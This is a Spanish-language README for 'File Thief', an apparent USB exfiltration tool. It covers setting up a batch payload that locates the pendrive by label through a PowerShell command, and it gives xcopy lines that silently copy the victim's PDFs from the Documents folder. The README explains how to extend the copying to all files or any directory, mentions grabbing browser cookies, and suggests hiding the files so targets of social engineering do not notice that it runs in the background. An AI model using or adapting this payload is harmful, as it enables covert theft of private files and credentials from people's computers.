# File Thief

### para que sirve

Este codigo se utiliza para poder extrar archivos (.pdf) de la carpeta de Documentos del Usuario con Windows.

### A tener en cuenta

 Para que esto funcione debe configurarse el nombre del pendrive dentro del archivo (USB Exfiltration Payload.bat)

    powershell ".((gwmi win32_volume -f 'label=''LABEL''').Name+'d.cmd')"

La etiqueta LABEL corresponde al nombre del pendrive.
    
Por ejemplo, si en pendrive tiene el nombre "MyPen" este nombre debe estar en el codigo del archivo USB Exfiltration Payload.bat como
    
    powershell ".((gwmi win32_volume -f 'label=''MyPen''').Name+'d.cmd')"
    
Todos los archivos deben ir sueltos dentro de la memoria.

Se pueden ocultar para que a la hora de hacer ing social no se percaten de estos archivos.

Los archivos se ejecutan en 2do plano asi que tranqui.

Esto demora lo que tenga que demorar, me explico, depende de la transferencia de archivos.
    
no es lo mismo copiar las cookies de los navegadores que copiar todas las imagenes de la computadora.

### Solo pdf's?

No! para poder cambiar esto solo se debe modificar el archivo (e.cmd) en la linea 22

    xcopy /C /Q /G /Y /S %USERPROFILE%\Documents\*.pdf %dst% >>nul

vemos que busca cualquier archivo con la extencion (.pdf), si queremos buscar cualquier archivo solo cambiamos la extencion por un (*), por ejemplo.

    xcopy /C /Q /G /Y /S %USERPROFILE%\Documents\*.* %dst% >>nul

de misma manera no estamos limitados a buscar en la carpeta de Documents\. Podemos recorrer cualquier parte del directorio.

### PoC

[Extraer PDF's](https://www.youtube.com/watch?v=prRtnkIW21M)

### Creador

[Agustin Bassi](https://twitter.com/aguztynbassi)
